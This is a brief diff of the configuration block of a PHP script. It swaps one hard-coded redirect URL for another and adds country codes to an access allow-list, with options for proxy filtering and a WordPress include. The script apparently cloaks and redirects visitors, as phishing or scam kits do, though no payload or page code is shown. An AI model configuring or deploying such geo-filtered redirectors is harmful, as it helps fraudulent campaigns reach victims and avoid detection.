@@ -57,13 +57,13 @@ if (isset($_GET["check"]))
 
 $license = "Houss-1987";
 
-$redirect = "https://a62c48bfd3.lb3.amezmo.co/12";
+$redirect = "https://c469dbbef4.lb3.amezmo.co/12";
 
 $parameter = 2; // 1 => Both , 2 => Country , 3 => Proxy , 4 => Simple
 $wordpress = true; // Allow Wordpress Include
 $checkfileup = false; // Check Link UP
 
-$country = array("ma","za","pl","ua","il","gr","cy","de","ch"); #Country's Allowed To Access
+$country = array("ma","za","pl","ua","il","gr","cy","de","ch","dk","es","sl","cz"); #Country's Allowed To Access
 
 /************************************************************* PARAMETRES ******************************************************************/
 
